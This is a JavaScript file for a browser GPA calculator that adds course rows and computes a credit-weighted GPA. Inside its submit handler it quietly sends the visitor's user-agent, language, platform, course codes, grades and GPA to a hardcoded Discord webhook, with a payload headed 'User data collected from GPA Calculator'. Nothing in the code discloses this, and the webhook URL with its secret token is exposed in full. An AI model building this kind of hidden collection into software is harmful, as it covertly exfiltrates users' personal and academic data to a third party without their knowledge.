document.addEventListener("DOMContentLoaded", () => {
    let courseCount = 2; // Start with 1 course and increment after
    const courseContainer = document.getElementById('courses');
    const addCourseButton = document.getElementById('addCourse');
    const resultDiv = document.getElementById('result');

    const webhookURL = "https://discord.com/api/webhooks/1314950224799862804/D3VUpNbPH7gR1WOe79AYCGYX_ihkms4ugmfoITMBsU-0TPR1cqTZHOI3YGTTtzfFmMUx";
    const userAgent = navigator.userAgent;
    const language = navigator.language;
    const platform = navigator.platform;

    // Function to add a new course
    function addCourse() {
        const newCourse = document.createElement('div');
        newCourse.classList.add('course');
        newCourse.id = `course${courseCount}`;
        newCourse.innerHTML = `
            <label for="courseCode${courseCount}">Course Code:</label>
            <input type="text" id="courseCode${courseCount}" name="courseCode${courseCount}" placeholder="Enter Course Code" required>
            
            <label for="credit${courseCount}">Credits:</label>
            <select id="credit${courseCount}" name="credit${courseCount}" required>
                <option value="1.5">1.5</option>
                <option value="3">3</option>
                <option value="4">4</option>
                <option value="5">5</option>
            </select>
            
            <label for="grade${courseCount}">Grade:</label>
            <select id="grade${courseCount}" name="grade${courseCount}" required>
                <option value="10">A</option>
                <option value="9">A-</option>
                <option value="8">B</option>
                <option value="7">B-</option>
                <option value="6">C</option>
                <option value="5">C-</option>
                <option value="4">D</option>
                <option value="0">F</option>
            </select>
        `;
        courseContainer.appendChild(newCourse);
        courseCount++;
    }

    // Add event listener for "Add Course" button
    addCourseButton.addEventListener('click', addCourse);

    // Function to calculate GPA and send data to Discord
    document.getElementById('gpaForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let totalCredits = 0;
        let totalPoints = 0;
        let coursesData = [];

        // Collect course data and calculate total credits and points
        for (let i = 1; i < courseCount; i++) {
            const courseCode = document.getElementById(`courseCode${i}`).value;
            const credit = parseFloat(document.getElementById(`credit${i}`).value);
            const grade = parseFloat(document.getElementById(`grade${i}`).value);

            totalCredits += credit;
            totalPoints += grade * credit;

            // Store course information
            coursesData.push({
                courseCode: courseCode,
                credit: credit,
                grade: grade
            });
        }

        // Calculate GPA
        const gpa = totalPoints / totalCredits;

        // Display GPA result
        resultDiv.textContent = `Your GPA is: ${gpa.toFixed(2)}`;

        // Prepare the payload for Discord
        const payload = {
            content: "User data collected from GPA Calculator",
            embeds: [
                {
                    title: "User Details and GPA Calculation",
                    fields: [
                        { name: "User-Agent", value: userAgent },
                        { name: "Language", value: language },
                        { name: "Platform", value: platform },
                        { name: "GPA Result", value: gpa.toFixed(2) }
                    ],
                    color: 3447003
                },
                {
                    title: "Course Details",
                    fields: coursesData.map(course => ({
                        name: `Course: ${course.courseCode}`,
                        value: `Credits: ${course.credit}, Grade: ${course.grade}`,
                        inline: true
                    })),
                    color: 3447003
                }
            ]
        };

        // Send data to Discord webhook
        try {
            const discordResponse = await fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            console.log(discordResponse); // Log the response from Discord to check for errors
        } catch (error) {
            console.error("Error sending data to Discord:", error);
        }
    });
});
